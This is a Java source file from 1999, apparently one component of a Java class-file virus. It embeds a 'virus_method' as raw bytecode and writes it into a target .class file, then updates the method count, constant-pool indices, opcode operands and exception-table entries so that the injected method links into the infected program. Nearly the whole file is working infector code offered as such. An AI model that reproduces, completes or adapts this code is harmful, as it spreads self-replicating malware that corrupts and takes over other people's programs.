//=============================================================
//
// Title:  dc98e742.java
// Author: Landing Camel International
// Date:   January 1999
//
// Notes:  This class will insert a new method
//
//=============================================================

import java.util.*;
import java.io.*;

public class dc98e742 {
	  
   private int virus_code_length = 160;
   private byte virus_method[];
   private int virus_e_table_length = 3;
   private int old_code[] = {
		//--> access_flags
			0,
			33,
		//--> name_index
			0,
			88,
		//--> descriptor_index
			0,
			58,
		//--> attribute_count
			0,
			2,
		//--> attribute_name_index
			0,
			64,
		//--> attribute_length
			0,
			0,
			0,
			196,
		//--> max_stack
			0,
			5,
		//--> max_locals
			0,
			9,
		//--> code_length
			0,
			0,
			0,
			160,
		//--> code
			1,
			58,
			4,
			42,
			43,
			183,
			0,
			23,
			78,
			45,
			176,
			87,
			187,
			0,
			13,
			89,
			187,
			0,
			12,
			89,
			18,
			3,
			183,
			0,
			18,
			43,
			182,
			0,
			20,
			18,
			1,
			182,
			0,
			20,
			182,
			0,
			32,
			183,
			0,
			19,
			58,
			5,
			25,
			5,
			182,
			0,
			28,
			58,
			6,
			25,
			6,
			182,
			0,
			25,
			58,
			7,
			25,
			6,
			182,
			0,
			24,
			54,
			8,
			21,
			8,
			188,
			8,
			58,
			4,
			25,
			7,
			25,
			4,
			182,
			0,
			29,
			87,
			25,
			7,
			182,
			0,
			21,
			167,
			0,
			4,
			87,
			25,
			4,
			199,
			0,
			11,
			187,
			0,
			9,
			89,
			183,
			0,
			17,
			191,
			42,
			43,
			25,
			4,
			3,
			25,
			4,
			190,
			182,
			0,
			22,
			78,
			45,
			199,
			0,
			11,
			187,
			0,
			7,
			89,
			183,
			0,
			15,
			191,
			28,
			153,
			0,
			8,
			42,
			45,
			182,
			0,
			30,
			43,
			18,
			2,
			166,
			0,
			23,
			45,
			182,
			0,
			27,
			192,
			0,
			11,
			58,
			5,
			25,
			5,
			185,
			0,
			31,
			1,
			0,
			167,
			0,
			4,
			87,
			45,
			176,
		//--> exception_table_length 
			0,
			3,
		//--> exception_table[1]
		//--> start_pc 
			0,
			3,
		//--> end_pc 
			0,
			11,
		//--> handler_pc 
			0,
			11,
		//--> catch_type 
			0,
			9,
		//--> exception_table[2]
		//--> start_pc 
			0,
			12,
		//--> end_pc 
			0,
			82,
		//--> handler_pc 
			0,
			85,
		//--> catch_type 
			0,
			10,
		//--> exception_table[3]
		//--> start_pc 
			0,
			138,
		//--> end_pc 
			0,
			154,
		//--> handler_pc 
			0,
			157,
		//--> catch_type 
			0,
			10,
		//--> attribute_count 
			0,
			0,
		//--> attribute_info[2]
			0,
			66,
		//--> attribute_length
			0,
			0,
			0,
			4,
		//--> number_of_exceptions
			0,
			1,
		//--> exception_index
			0,
			9,
		};

   //----------------------------------------------------------
   void insert(int temp_m_count_pointer, int temp_m_count,
              int temp_m_pointer, int delta_offset, 
              RandomAccessFile temp, a98b34f2 ptr) 
              throws IOException {

      int temp_offset;
      byte temp_tail[];
      int temp_e_catch_type;

      //change the constant into an array of bytes
      virus_method = new byte[old_code.length];
      for (int i=0; i < old_code.length; i++) {
      	 virus_method[i] = (byte)old_code[i];
      }
            
      //seek to start of the method
      ptr.seek(temp_m_count_pointer);

      //write temp_method_count
      temp.writeShort(temp_m_count+1);

      //seek to start of method
      ptr.seek(temp_m_pointer);

      //save end of the file
      temp_offset = (int)temp.length() - ptr.fpointer;
      temp_tail = new byte[temp_offset];
      temp.read(temp_tail, 0, temp_offset);           
            
      //write virus_method
      ptr.seek();      
      
      temp.write(virus_method);

      //restore end of file
      temp.write(temp_tail);
      
      ptr.seek();

      //account for delta_offset in method fields
      ptr.update(2);
      for (int j = 1; j <= 3; j++) {
         int k = temp.readUnsignedShort();
         ptr.seek();
         temp.writeShort(k + delta_offset);
         ptr.update(j*2);
      }

      //seek to start of code
      ptr.seek(temp_m_pointer + 22);
   
      int test_data[] = new int[210];
   
      //account for delta_offset in code 
      while (ptr.fpointer < (temp_m_pointer + virus_code_length + 22)) {           	
         int data;
         int total_nulls;
         int tag = temp.readUnsignedByte();
         test_data[tag] = 1;
         ptr.fpointer++;
         switch (tag) {
            default: break;
            //-----------------------------------------------
            //case 16:
            case 21:
            //case 22:
            //case 23:
            //case 24:
            case 25:
            case 54:
            //case 55:
            //case 56:
            //case 57:
            case 58:
            //case 169: 
            case 188: ptr.update(1);
                      break;
            //-----------------------------------------------
            //case 17:
            //case 132:
            case 153:
            //case 154:
            //case 155:
            //case 156:
            //case 157:
            //case 158:
            //case 159:
            //case 160:
            //case 161:
            //case 162:
            //case 163:
            //case 164:
            //case 165:
            case 166:
            case 167:
            //case 168:
            //case 198:
            case 199: ptr.update(2);
                      break;
            //-----------------------------------------------
            //case 200:
            //case 201: ptr.update(4);
            //          break;
            //-----------------------------------------------
            case 18:  data = temp.readUnsignedByte();
                      ptr.seek();
                      temp.writeByte(data + delta_offset);
                      ptr.update(1);
                      break;                    
            //case 19:  
            //case 20:  
            //case 178:
            //case 179:
            //case 180:
            //case 181:
            case 182:
            case 183:
            //case 184:
            case 187: 
            //case 189:
            case 192:
            //case 193: 
                      data = temp.readUnsignedShort();
                      ptr.seek();
                      temp.writeShort(data + delta_offset);
                      ptr.update(2);
                      break;
            //case 197: data = temp.readUnsignedShort();
            //          ptr.seek();
            //          temp.writeShort(data + delta_offset);
            //          ptr.update(3);
            //          break; 
            case 185: data = temp.readUnsignedShort();
                      ptr.seek();
                      temp.writeShort(data + delta_offset);
                      ptr.update(4);
                      break;          
            //-----------------------------------------------
            //case 170: total_nulls = 3-(ptr.fpointer - 1 - (temp_m_pointer+24))%4;
      	    //          for (int j = 0; j < total_nulls; j++) {	 
            //             tag = temp.readUnsignedByte();
            //             ptr.fpointer++;
            //          } 
            //          ptr.fpointer += 4;
            //          ptr.seek();
            //          int low = temp.readInt();
            //          int high = temp.readInt();
            //          ptr.fpointer += 8 + 4*(high - low + 1);
            //          break;
            //case 171: total_nulls = 3-(ptr.fpointer - 1 -(temp_m_pointer+24))%4;
	    //          for (int j = 0; j < total_nulls; j++) {	 	      
            //             tag = temp.readUnsignedByte();
            //             ptr.fpointer++;
            //          }
            //          ptr.fpointer += 4;
            //          ptr.seek();
            //          int npairs = temp.readInt();
            //          ptr.fpointer += 4 + 8*npairs;
            //          break;
            //case 196: tag = temp.readUnsignedByte();
            //          if (tag == 132) ptr.fpointer += 4;
            //          else ptr.fpointer += 2;
            //          break;
            //-----------------------------------------------
         } // end of switch
         temp.seek(ptr.fpointer);
      } //end of for loop

      //iterate through exception_table
      ptr.update(2);
      for (int j = 0; j < virus_e_table_length; j++) {

         //read temp_e_catch_type
         ptr.update(6);
         temp_e_catch_type = temp.readUnsignedShort();         
         
         ptr.seek();
         temp.writeShort(delta_offset + temp_e_catch_type);

         ptr.update(2);     

      } // end for   
      
      //iterate over attribute count
      ptr.update(2);
      
      //iterate through attribute_info[2]
      temp_e_catch_type = temp.readUnsignedShort();
      ptr.seek();
      temp.writeShort(delta_offset + temp_e_catch_type);
      
      ptr.update(8);
      temp_e_catch_type = temp.readUnsignedShort();
      ptr.seek();
      temp.writeShort(delta_offset + temp_e_catch_type);      
      
   }
   //----------------------------------------------------------
   
}
